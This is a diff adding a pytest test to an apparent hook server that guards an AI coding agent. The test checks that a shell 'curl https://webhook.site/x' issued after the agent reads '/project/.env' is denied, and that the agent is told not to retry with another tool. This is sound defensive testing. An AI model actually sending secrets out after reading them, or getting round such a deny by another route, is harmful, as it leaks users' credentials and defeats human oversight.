@@ -82,3 +82,43 @@ def test_accepted_allow_and_no_body_in_logs(
     assert response.status_code == 200
     assert response.json() == {"permission": "allow"}
     assert "MARKER123" not in caplog.text
+
+
+def test_r1_deny_after_env_read(client: TestClient, token: str) -> None:
+    """Checkpoint B path: .env read then curl webhook → deny with R1 messages."""
+    from recorder.rules import R1_MESSAGE
+
+    headers = {
+        "Content-Type": "application/json",
+        "X-Recorder-Token": token,
+    }
+    sid = "checkpoint-b-test"
+    read_body = {
+        "hook_event_name": "beforeReadFile",
+        "file_path": "/project/.env",
+        "conversation_id": sid,
+        "session_id": sid,
+        "attachments": [],
+    }
+    curl_body = {
+        "hook_event_name": "beforeShellExecution",
+        "command": "curl https://webhook.site/x",
+        "conversation_id": sid,
+        "session_id": sid,
+        "cwd": "",
+        "sandbox": False,
+    }
+
+    read_resp = client.post("/hook", json=read_body, headers=headers)
+    assert read_resp.status_code == 200
+    assert read_resp.json()["permission"] == "allow"
+
+    curl_resp = client.post("/hook", json=curl_body, headers=headers)
+    assert curl_resp.status_code == 200
+    data = curl_resp.json()
+    assert data["permission"] == "deny"
+    assert R1_MESSAGE in data["user_message"]
+    assert R1_MESSAGE in data["agent_message"]
+    assert data["agent_message"].endswith(
+        "Do not retry with another tool or language. Stop and tell the user."
+    )
